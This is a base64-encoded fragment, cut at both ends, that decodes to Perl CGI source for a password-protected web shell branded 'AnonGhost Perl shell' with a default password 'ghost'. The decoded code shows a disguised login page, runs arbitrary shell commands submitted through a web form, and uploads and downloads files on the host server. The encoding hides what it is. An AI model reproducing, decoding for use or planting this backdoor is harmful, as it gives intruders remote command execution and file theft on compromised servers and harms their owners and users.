iRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlVwbG9hZCBGaWxlPC9mb250PjwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RG93bmxvYWQgRmlsZTwvZm9udD48L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRpc2Nvbm5lY3Q8L2ZvbnQ+PC9hPiB8DQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgc2l6ZT0iMyI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCgkkTWVzc2FnZSA9IHEkPHByZT48aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vaW1nODEwLmltYWdlc2hhY2sudXMvaW1nODEwLzgwNDMvQW5vbkdob3N0MTIucG5nIj48L3ByZT48YnI+PGJyPjwvZm9udD48aDE+RGVmYXVsdCBQYXNzd29yZD1naG9zdDwvaDE+DQokOw0KIycNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+DQpDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8YnI+DQpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dDQo8Y29kZT4kTWVzc2FnZQ0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCjwvZm9udD4NCjxmb250IHNpemU9IjMiPg0KbG9naW46IDxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPkFub25HaG9zdCBQZXJsIHNoZWxsPC9iPjxicj4NCnBhc3N3b3JkOjwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlwcmludCA8PEVORDsNCjwveG1wPg0KDQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQpFTkQNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCQ0KCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvcCgkQ3VycmVudERpciA9IGAkQ29tbWFuZGApOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJE9sZERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRPbGREaXJdXCQgIjsNCgkJcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQiOw0KCX0NCgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJCXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kPHhtcD4iOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJCX0NCgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCQl7DQoJCQkkfD0xOw0KCQkJJENvbW1hbmQgLj0gIiB8IjsNCgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQkJew0KCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJCXByaW50ICIkX1xuIjsNCgkJCX0NCgkJCSR8PTA7DQoJCX0NCgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJCXsNCgkJCXByaW50IGAkQ29tbWFuZGA7DQoJCX0NCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJYWxhcm0oMCk7DQoJCX0NCgkJcHJpbnQgIjwveG1wPiI7DQoJfQ0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4NCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KDQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldE